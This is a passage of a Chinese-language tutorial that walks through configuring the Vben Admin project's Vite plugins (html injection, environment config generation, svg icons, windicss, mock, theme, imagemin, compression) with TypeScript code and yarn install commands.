build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import legacy from \u0026#39;@vitejs/plugin-legacy\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // @vitejs/plugin-legacy VITE_LEGACY \u0026amp;\u0026amp; isBuild \u0026amp;\u0026amp; vitePlugins.push(legacy()); // ... return vitePlugins; } Vite插件-vite-plugin-html 說明 原文描述：\n一個為index.html提供minify和基於EJS模板功能的Vite插件。\nminify：壓縮index.html代碼。 EJS：給index.html提供訪問變量的能力。 參考連結 vite-plugin-html的npm首頁 安裝 1 yarn add vite-plugin-html --dev 創建配置文件 build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; // ↓ 這里後續章動態配置講解 // const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; // const getAppConfigSrc = () =\u0026gt; { // return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; // }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // ↓ 這里後續章動態配置講解 // tags: isBuild // ? [ // { // tag: \u0026#39;script\u0026#39;, // attrs: { // src: getAppConfigSrc(), // }, // }, // ] // : [], }, }); return htmlPlugin; } 配置Vite插件 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configHtmlPlugin } from \u0026#39;./html\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-html vitePlugins.push(configHtmlPlugin(viteEnv, isBuild)); // ... } 補充 做完本章操作之後，我突然發現項目不能編譯了。\n總是報package.json找不到。我看了一下代碼，主要就是build\\vite\\plugin\\html.ts中的導入無法找到。\n我反復對比了一下VbenAdmin的源碼。也沒有發現有什麼不同的地方。\n然後我又試了一下，當執行vite命令的時候，build文件夾下始終不能訪問package.json。但是src和vite.config.ts中都可以導入訪問。\n那麼這裡有兩種講解方案：\n去掉導入 這裡的導入只是我們在使用_app.config.js的時候加上一個版本信息。可以讓我們知道這個項目是多久打包的，打包的時候版本是多少。所以去掉也無妨，_app.config.js還是一樣可以訪問的。\n從vite.config.ts中傳參下去 我使用了這個方案，因為萬一build文件夾其他地方要用package.json呢。不過用的地方應該也很少吧。\n修改vite.config.ts：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import pkg from \u0026#39;./package.json\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed plugins: createVitePlugins(viteEnv, isBuild, pkg), // ... }; }; 修改build/vite/plugin/index.ts：\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... vitePlugins.push(configHtmlPlugin(viteEnv, isBuild, pkg)); return vitePlugins; } 修改build/vite/plugin/html.ts：\nbuild/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import html from \u0026#39;vite-plugin-html\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean, pkg: any) { // ... const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; // ... return htmlPlugin; } 完善build的utils.ts 說明 完善build\\utils.ts文件。\n第一部分 除了這個process，應該也沒有要解釋的吧。\nNode中文文檔-process\nbuild/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export function isDevFn(mode: string): boolean { return mode === \u0026#39;development\u0026#39;; } export function isProdFn(mode: string): boolean { return mode === \u0026#39;production\u0026#39;; } /** * Whether to generate package preview */ export function isReportMode(): boolean { return process.env.REPORT === \u0026#39;true\u0026#39;; } 安裝dotenv dotenv依賴的作用：從.evn文件流Buffer中讀取屬性輸出一個對象。\n那麼和我們之前的加載環境變量的區別：\nVite的loadEnv()：這個方法Vite的官網上貌似沒有開放，而且獲取的文件是指定的，獲取的對象需要我們自己格式化一下。 Vben的wrapperEnv()：這是一個格式化環境變量的方法。 dotenv：是一個依賴，其功能不僅僅是獲取環境變量，當然我們目前只用它來獲取指定的.env文件。 dotenv的npm首頁\n1 yarn add dotenv --dev 第二部分 Node中文文檔-fs Node中文文檔-path dotenv的npm首頁 build/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import fs from \u0026#39;fs\u0026#39;; import path from \u0026#39;path\u0026#39;; import dotenv from \u0026#39;dotenv\u0026#39;; /** * Get the environment variables starting with the specified prefix * @param match prefix * @param confFiles ext */ export function getEnvConfig(match = \u0026#39;VITE_GLOB_\u0026#39;, confFiles = [\u0026#39;.env\u0026#39;, \u0026#39;.env.production\u0026#39;]) { let envConfig = {}; // ↓ 循環文件名 confFiles.forEach((item) =\u0026gt; { try { // ↓ 同步讀取根目錄下指定的文件，將讀取的六傳入dotenv輸出對象 const env = dotenv.parse(fs.readFileSync(path.resolve(process.cwd(), item))); // ↓ 將新獲取的對象追加到結果中，相同的覆蓋 envConfig = { ...envConfig, ...env }; } catch (error) {} }); // ↓ 檢查輸出結果 Object.keys(envConfig).forEach((key) =\u0026gt; { // ↓ 如果不是以傳入的match變量開的就直接刪除 const reg = new RegExp(`^(${match})`); if (!reg.test(key)) { Reflect.deleteProperty(envConfig, key); } }); return envConfig; } /** * Get user root directory * @param dir file path */ export function getRootPath(...dir: string[]) { return path.resolve(process.cwd(), ...dir); } Vben的獲取配置文件名的方法 build/getConfigFileName.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 /** * Get the configuration file variable name * @param env */ export const getConfigFileName = (env: Record\u0026lt;string, any\u0026gt;) =\u0026gt; { return ( `__PRODUCTION__${env.VITE_GLOB_APP_SHORT_NAME || \u0026#39;__APP\u0026#39;}__CONF__` // ↓ 換成大寫 .toUpperCase() // ↓ 將空白換成空字符串 .replace(/\\s/g, \u0026#39;\u0026#39;) ); }; Vben動態配置環境變量 說明 前面章節中，我們在build\\vite\\plugin中註釋一段index.html中插入的script段。這一段script是用於Vben的動態配置環境變量的。\n當你打包完項目之後，你的項目的環境變量就不可以變了。此時如果你想修改一下項目的基礎API路徑，那麼你需要修改.env文件，然後再次打包一遍。這麼做很麻煩。所以VbenAdmin將環境變量抽離出來。\n當你的項目打包完成之後，如果你還想修改環境變量，那麼可以直接修改dist包下的_app.config.js文件。\n下面看實現。\n安裝fs-extra 1 yarn add fs-extra @types/fs-extra --dev fs-extra的npm首頁：fs-extra添加本機fs模塊中未包含的文件系統方法。\n編寫生成配置文件的程序 Node-Api-fs\nbuild/script/buildConf.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 /** * Generate additional configuration files when used for packaging. The file can be configured with some global variables, so that it can be changed directly externally without repackaging */ import { GLOB_CONFIG_FILE_NAME, OUTPUT_DIR } from \u0026#39;../constant\u0026#39;; import fs, { writeFileSync } from \u0026#39;fs-extra\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import { getRootPath, getEnvConfig } from \u0026#39;../utils\u0026#39;; import { getConfigFileName } from \u0026#39;../getConfigFileName\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; function createConfig( { // ↓ windows對像下的存儲配置的屬性名 configName, // ↓ 存儲配置的對象 config, // ↓ JS文件名 configFileName = GLOB_CONFIG_FILE_NAME, }: { configName: string; config: any; configFileName?: string } = { configName: \u0026#39;\u0026#39;, config: {} } ) { try { // ↓ 變量字符串 const windowConf = `window.${configName}`; // Ensure that the variable will not be modified // ↓ 將配置的對像以JSON字符串格式拼接到變量字符串後面，最後用正則將空格去掉 const configStr = `${windowConf}=${JSON.stringify(config)}; Object.freeze(${windowConf}); Object.defineProperty(window, \u0026#34;${configName}\u0026#34;, { configurable: false, writable: false, }); `.replace(/\\s/g, \u0026#39;\u0026#39;); // ↓ 創建dist文件夾 fs.mkdirp(getRootPath(OUTPUT_DIR)); // ↓ 將字符串寫入到dist文件下的指定JS文件名的文件中 writeFileSync(getRootPath(`${OUTPUT_DIR}/${configFileName}`), configStr); console.log(chalk.cyan(`✨ [${pkg.name}]`) + ` - configuration file is build successfully:`); console.log(chalk.gray(OUTPUT_DIR + \u0026#39;/\u0026#39; + chalk.green(configFileName)) + \u0026#39;\\n\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;configuration file configuration file failed to package:\\n\u0026#39; + error)); } } export function runBuildConfig() { // ↓ 獲取我們可以配置的環境變量對象 const config = getEnvConfig(); // ↓ 獲取配置文件的JS名 const configFileName = getConfigFileName(config); // ↓ 創建文件 createConfig({ config, configName: configFileName }); } 安裝yargs yargs的npm首頁：讀取你執行的命令行命令中的參數選項。\n1 2 yarn add yargs --dev yarn add @types/yargs --dev 編寫腳本觸發文件 chalk的npm首頁：一個彩色console.log的工具，這個依賴被其他依賴作為生產依賴安裝在本項目中了，所以也不去猜是哪個依賴的了，直接使用。\nbuild/script/postBuild.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // #!/usr/bin/env node import { argv } from \u0026#39;yargs\u0026#39;; import { runBuildConfig } from \u0026#39;./buildConf\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; // ↓ 定義創建配置文件的方法，最條件判斷 export const runBuild = async () =\u0026gt; { try { // 獲取命令中不以\u0026#39;-\u0026#39;開頭的參數 const argvList = argv._; // Generate configuration file // ↓ 如果參數中包含\u0026#39;no-conf\u0026#39;，那麼就不創建配置文件 if (!argvList.includes(\u0026#39;no-conf\u0026#39;)) { // ↓ 同步創建配置文件 await runBuildConfig(); } console.log(`✨ ${chalk.cyan(`[${pkg.name}]`)}` + \u0026#39; - build successfully!\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;vite build error:\\n\u0026#39; + error)); process.exit(1); } }; // ↓ 執行方法 runBuild(); 安裝esno esno的npm首頁：命令行執行一個TS文件\n1 yarn add esno --dev 編寫腳本 在編譯的時候調用TS文件：\npackage.json 1 2 3 4 5 6 7 { \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, \u0026#34;build-noconf\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts no-conf\u0026#34; } } index.html注入配置文件 build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // Embed the generated app.config.js file // ↓ 在此處插入 tags: isBuild ? [ { tag: \u0026#39;script\u0026#39;, attrs: { src: getAppConfigSrc(), }, }, ] : [], }, }); return htmlPlugin; } 注意 之後在業務邏輯中獲取環境變量，就需要從這個JS文件中獲取了。從而達到在生產環境改配置的需求。\n參考：src\\utils\\env.ts，但是這個後面再說。\nVite插件-vite-plugin-svg-icon 說明 當你使用該插件的時候，指定好存放svg的文件夾。再按照指定的方式去訪問svg圖片。就可以再不產生http請求的情況下渲染出svg圖片。\n使用該插件時，插件會自動將所有svg圖片加載到HTML中。並且每一個svg將會被過濾去無用的信息數據。讓svg達到最小的值。之後使用svg圖片就只需要操作DOM即可，而不需要發送http請求。\n安裝 1 yarn add vite-plugin-svg-icons --dev 創建配置 build/vite/plugin/svgSprite.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * Vite Plugin for fast creating SVG sprites. * https://github.com/anncwb/vite-plugin-svg-icons */ import SvgIconsPlugin from \u0026#39;vite-plugin-svg-icons\u0026#39;; import path from \u0026#39;path\u0026#39;; export function configSvgIconsPlugin(isBuild: boolean) { const svgIconsPlugin = SvgIconsPlugin({ // ↓ 本地svg圖片地址 iconDirs: [path.resolve(process.cwd(), \u0026#39;src/assets/icons\u0026#39;)], svgoOptions: isBuild, // 圖標ID的樣式 symbolId: \u0026#39;icon-[dir]-[name]\u0026#39;, }); return svgIconsPlugin; } 選項svgOptions的boolean類型不太清楚是乾什麼的。但是對像類型是控制svg過濾無用信息的選項。使用true是使用默認選項，false時不知道做什麼的但是也沒什麼影響。\n用於配置 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configSvgIconsPlugin } from \u0026#39;./svgSprite\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-svg-icons vitePlugins.push(configSvgIconsPlugin(isBuild)); // ... return vitePlugins; } main導入 src/main.ts 1 2 3 // ... import \u0026#39;vite-plugin-svg-icons/register\u0026#39;; // ... 創建Svg組件 這裡有一個樣式，是全局上下文注入的。這個後面再講，先寫成string。\nsrc/components/Icon/src/SvgIcon.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;template\u0026gt; \u0026lt;svg class=\u0026#34;vben-svg-icon\u0026#34; :class=\u0026#34;[$attrs.class]\u0026#34; :style=\u0026#34;getStyle\u0026#34; aria-hidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;use :xlink:href=\u0026#34;symbolId\u0026#34; /\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import type { CSSProperties } from \u0026#39;vue\u0026#39;; import { defineComponent, computed } from \u0026#39;vue\u0026#39;; // import { useDesign } from \u0026#39;/@/hooks/web/useDesign\u0026#39;; export default defineComponent({ name: \u0026#39;SvgIcon\u0026#39;, props: { prefix: { type: String, default: \u0026#39;icon\u0026#39;, }, name: { type: String, required: true, }, size: { type: [Number, String], default: 16, }, }, setup(props) { // const { prefixCls } = useDesign(\u0026#39;svg-icon\u0026#39;); const symbolId = computed(() =\u0026gt; `#${props.prefix}-${props.name}`); const getStyle = computed( (): CSSProperties =\u0026gt; { const { size } = props; let s = `${size}`; s = `${s.replace(\u0026#39;px\u0026#39;, \u0026#39;\u0026#39;)}px`; return { width: s, height: s, }; } ); // prefixCls, return { symbolId, getStyle }; }, }); \u0026lt;/script\u0026gt; \u0026lt;style lang=\u0026#34;less\u0026#34; scoped\u0026gt; // @prefix-cls: ~\u0026#39;@{namespace}-svg-icon\u0026#39;; // .@{prefix-cls} { .vben-svg-icon { overflow: hidden; vertical-align: -0.15em; fill: currentColor; } \u0026lt;/style\u0026gt; Vite插件-vite-plugin-windicss 說明 在Vite上單獨使用Tailwind時，渲染速度很慢。\nvite-plugin-windicss比Tailwind快20到100倍。\nvite-plugin-windicss的npm首頁 windicss官網 安裝 1 yarn add vite-plugin-windicss --dev 創建Windicss配置文件 windicss的配置 tailwind的配置 tailwind.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 import lineClamp from \u0026#39;windicss/plugin/line-clamp\u0026#39;; import colors from \u0026#39;windicss/colors\u0026#39;; import { defineConfig } from \u0026#39;vite-plugin-windicss\u0026#39;; import { primaryColor } from \u0026#39;./build/config/themeConfig\u0026#39;; export default defineConfig({ darkMode: \u0026#39;class\u0026#39;, plugins: [lineClamp, createEnterPlugin()], theme: { extend: { colors: { ...colors, primary: primaryColor, }, screens: { sm: \u0026#39;576px\u0026#39;, md: \u0026#39;768px\u0026#39;, lg: \u0026#39;992px\u0026#39;, xl: \u0026#39;1200px\u0026#39;, \u0026#39;2xl\u0026#39;: \u0026#39;1600px\u0026#39;, }, }, }, }); /** * Used for animation when the element is displayed * @param maxOutput The larger the maxOutput output, the larger the generated css volume */ function createEnterPlugin(maxOutput = 10) { const createCss = (index: number, d = \u0026#39;x\u0026#39;) =\u0026gt; { const upd = d.toUpperCase(); return { [`*\u0026gt; .enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(50px)`, }, [`*\u0026gt; .-enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(-50px)`, }, [`* \u0026gt; .enter-${d}:nth-child(${index}),* \u0026gt; .-enter-${d}:nth-child(${index})`]: { \u0026#39;z-index\u0026#39;: `${10 - index}`, opacity: \u0026#39;0\u0026#39;, animation: `enter-${d}-animation 0.4s ease-in-out 0.3s`, \u0026#39;animation-fill-mode\u0026#39;: \u0026#39;forwards\u0026#39;, \u0026#39;animation-delay\u0026#39;: `${(index * 1) / 10}s`, }, }; }; const handler = ({ addBase }) =\u0026gt; { const addRawCss = {}; for (let index = 1; index \u0026lt; maxOutput; index++) { Object.assign(addRawCss, { ...createCss(index, \u0026#39;x\u0026#39;), ...createCss(index, \u0026#39;y\u0026#39;), }); } addBase({ ...addRawCss, [`@keyframes enter-x-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateX(0)\u0026#39;, }, }, [`@keyframes enter-y-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateY(0)\u0026#39;, }, }, }); }; return { handler }; } 創建配置文件 build/vite/plugin/windicss.ts 1 2 3 4 5 6 7 8 9 10 11 12 import type { Plugin } from \u0026#39;vite\u0026#39;; import windiCSS from \u0026#39;vite-plugin-windicss\u0026#39;; export function configWindiCssPlugin(): Plugin[] { return windiCSS({ safelist: \u0026#39;no-select\u0026#39;, preflight: { enableAll: true, }, }); } 應用配置 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configWindiCssPlugin } from \u0026#39;./windicss\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-windicss vitePlugins.push(configWindiCssPlugin()); return vitePlugins; } 導入樣式 src/main.ts 1 2 3 // ... import \u0026#39;@virtual/windi.css\u0026#39;; // ... Vite插件-vite-plugin-mock 說明 vite-plugin-mock的npm首頁\n根據我自己的實驗：\nlocalEnabled控制mock開發環境是否啟動。\n如果生產環境想要使用mock，只有prodEnabled為true，injectCode注入指定代碼時才會生效。\n安裝 1 yarn add mockjs vite-plugin-mock --dev 編寫Mock用例 這裡直接將根目錄下的mock目錄拷貝出來就行。\nmock\\_util.ts：裡面封裝的是數據請求結構類型。 mock\\_createProductionServer.ts：用於配置生產環境動態Mock的js文件，文檔中有說。 其他的：都是Mock用例，每一個js、ts，都要默認導出一個MockMethod類型的數組。每一項MockMethod就是攔截的一個方法。MockMethod的response對應方法的return將會被Mock實例處理。也就是說，你可以在return的對像中使用Mock規則。 不過_createProductionServer.ts中使用了Glob 導入。\n配置Mock build/vite/plugin/mock.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Mock plugin for development and production. * https://github.com/anncwb/vite-plugin-mock */ import { viteMockServe } from \u0026#39;vite-plugin-mock\u0026#39;; export function configMockPlugin(isBuild: boolean) { return viteMockServe({ // ↓ 忽略以_開頭的文件 ignore: /^\\_/, // ↓ 解析根目錄下的mock文件夾 mockPath: \u0026#39;mock\u0026#39;, localEnabled: !isBuild, prodEnabled: isBuild, injectCode: ` import { setupProdMockServer } from \u0026#39;../mock/_createProductionServer\u0026#39;; setupProdMockServer(); `, }); } 配置進Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configMockPlugin } from \u0026#39;./mock\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-mock VITE_USE_MOCK \u0026amp;\u0026amp; vitePlugins.push(configMockPlugin(isBuild)); return vitePlugins; } Vite插件-vite-plugin-purge-icons 說明 本章的插件是可以讓我們很方便高效的使用Iconify中所有的圖標。\n這裡要講的是Iconify各個版本插件的區別：\nVue3版Iconify插件：使用時需要安裝指定庫的圖標，然後靜態引用。每一次引用都會產生一次http請求。 PurgeIcons：將我們所使用的Iconify圖標都已html的dom節點形式保存在html中，這樣我們就可以不發送http請求就可以使用圖標了。 vite-plugin-purge-icons：就是Vite版的PurgeIcons。 vite-plugin-purge-icons的npm首頁\n安裝 1 2 yarn add @iconify/iconify yarn add vite-plugin-purge-icons @iconify/json --dev 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import PurgeIcons from \u0026#39;vite-plugin-purge-icons\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-purge-icons vitePlugins.push(PurgeIcons()); // ... return vitePlugins; } 注意 Icon組件後面再封裝，由於我們main.ts中沒有引入vite-plugin-purge-icons。所以，這裡還不能使用。後面會動態生成圖標。\nVite插件-vite-plugin-style-import 說明 vite-plugin-style-import的npm首頁\n該插件可按需導入組件庫樣式，由於 vite 本身已按需導入了組件庫，因此僅樣式不是按需導入的，因此只需按需導入樣式即可。\n安裝 1 yarn add vite-plugin-style-import --dev 配置插件 build/vite/plugin/styleImport.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Introduces component library styles on demand. * https://github.com/anncwb/vite-plugin-style-import */ import styleImport from \u0026#39;vite-plugin-style-import\u0026#39;; export function configStyleImportPlugin() { // if (!isBuild) return []; const pwaPlugin = styleImport({ libs: [ { libraryName: \u0026#39;ant-design-vue\u0026#39;, esModule: true, resolveStyle: (name) =\u0026gt; { return `ant-design-vue/es/${name}/style/index`; }, }, ], }); return pwaPlugin; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configStyleImportPlugin } from \u0026#39;./styleImport\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-style-import vitePlugins.push(configStyleImportPlugin()); return vitePlugins; } Vite插件-rollup-plugin-visualizer 說明 rollup-plugin-visualizer的npm首頁：依賴分析插件。 cross-env的npm首頁：命令行配置環境變量。 安裝 1 yarn add rollup-plugin-visualizer @types/rollup-plugin-visualizer --dev 配置插件 build/vite/plugin/visualizer.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Package file volume analysis */ import visualizer from \u0026#39;rollup-plugin-visualizer\u0026#39;; import { isReportMode } from \u0026#39;../../utils\u0026#39;; import type { Plugin } from \u0026#39;vite\u0026#39;; export function configVisualizerConfig() { if (isReportMode()) { return visualizer({ filename: \u0026#39;./node_modules/.cache/visualizer/stats.html\u0026#39;, open: true, // @ts-ignore gzipSize: true, // @ts-ignore brotliSize: true, }) as Plugin; } return []; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configVisualizerConfig } from \u0026#39;./visualizer\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // rollup-plugin-visualizer vitePlugins.push(configVisualizerConfig()); return vitePlugins; } 安裝cross-env 1 yarn add cross-env --dev 編輯腳本 package.json 1 2 3 4 5 6 7 8 9 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34; // ... } // ... } Vite插件-vite-plugin-theme 說明 vite-plugin-theme的npm首頁：Git站點，npm的失效了。\n用於動態更改界面主題色的 vite 插件。\n配置插件 build/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); const plugin = viteThemePlugin({ // ↓ 之前生成的很多個顏色 colorVariables: [...getThemeColors(), ...colors], }); return plugin; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configThemePlugin } from \u0026#39;./theme\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... //vite-plugin-theme vitePlugins.push(configThemePlugin()); return vitePlugins; } 修改主題方法 之後要修改主題，直接調用一下這個方法即可。\nsrc/logics/theme/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { getThemeColors, ThemeMode, generateColors } from \u0026#39;../../../build/config/themeConfig\u0026#39;; import { replaceStyleVariables } from \u0026#39;vite-plugin-theme/es/client\u0026#39;; import { mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme/es/colorUtils\u0026#39;; export async function changeTheme(color: string, theme?: ThemeMode) { const colors = generateColors({ mixDarken, mixLighten, tinycolor, color, }); return await replaceStyleVariables({ colorVariables: [...getThemeColors(color, theme), ...colors], }); } Vite插件-vite-plugin-imagemin 說明 vite-plugin-imagemin的npm首頁：一個壓縮圖片資源的 vite 插件。\n配置鏡像(用於安裝imagemin的依賴，因為中國可能沒有安裝imagemin。) 若非中國用戶，可跳過配置鏡像\npackage.json 1 2 3 4 \u0026#34;resolutions\u0026#34;: { \u0026#34;//\u0026#34;: \u0026#34;用於安裝imagemin的依賴關係，因為中國可能沒有安裝imagemin。\u0026#34;, \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; }, 安裝 1 yarn add vite-plugin-imagemin --dev 配置插件 build/vite/plugin/imagemin.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // Image resource files used to compress the output of the production environment // https://github.com/anncwb/vite-plugin-imagemin import viteImagemin from \u0026#39;vite-plugin-imagemin\u0026#39;; export function configImageminPlugin() { const plugin = viteImagemin({ gifsicle: { optimizationLevel: 7, interlaced: false, }, optipng: { optimizationLevel: 7, }, webp: { quality: 75, }, mozjpeg: { quality: 8, }, pngquant: { quality: [0.8, 0.9], speed: 4, }, svgo: { plugins: [ { removeViewBox: false, }, { removeEmptyAttrs: false, }, ], }, }); return plugin; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 // ... import { configImageminPlugin } from \u0026#39;./imagemin\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... if (isBuild) { //vite-plugin-imagemin VITE_USE_IMAGEMIN \u0026amp;\u0026amp; vitePlugins.push(configImageminPlugin()); } return vitePlugins; } Vite插件-vite-plugin-compression 說明 vite-plugin-compression的npm首頁：vite-plugin-compress的增強版，壓縮用的。\n安裝 1 yarn add vite-plugin-compression --dev 配置插件 build/vite/plugin/compress.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /** * Used to package and output gzip. Note that this does not work properly in Vite, the specific reason is still being investigated * https://github.com/anncwb/vite-plugin-compression */ import type { Plugin } from \u0026#39;vite\u0026#39;; import compressPlugin from \u0026#39;vite-plugin-compression\u0026#39;; export function configCompressPlugin(compress: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39;): Plugin | Plugin[] { const compressList = compress.split(\u0026#39;,\u0026#39;); const plugins: Plugin[] = []; if (compressList.includes(\u0026#39;gzip\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.gz\u0026#39;, }) ); } if (compressList.includes(\u0026#39;brotli\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.br\u0026#39;, algorithm: \u0026#39;brotliCompress\u0026#39;, }) ); } return 